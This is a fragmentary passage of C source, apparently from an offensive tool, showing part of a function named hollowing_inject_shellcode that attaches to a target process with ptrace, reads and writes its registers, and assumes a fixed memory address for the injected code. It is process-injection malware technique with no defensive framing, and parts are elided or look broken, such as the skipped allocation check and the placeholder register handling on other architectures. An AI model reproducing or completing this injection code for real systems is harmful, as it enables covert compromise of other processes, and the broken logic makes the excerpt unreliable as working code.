...
static void hollowing_inject_shellcode(pid_t target_pid)
{
    ...
    // Get current registers (architecture-specific)
    #ifdef __x86_64__
    ...
    ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);
    #else
    // For other architectures, use a simpler approach
    long regs = 0;
    #endif
    
    // Allocate memory in target process (simplified for cross-compilation)
    long mmap_addr = 0x10000000; // Use a fixed address for embedded systems
    
    // Skip memory allocation check for embedded systems
    // if (mmap_addr == -1) {
    ...
    ptrace(PTRACE_SETREGS, target_pid, NULL, &regs);
    #else
    // For other architectures, skip register modification
    #endif
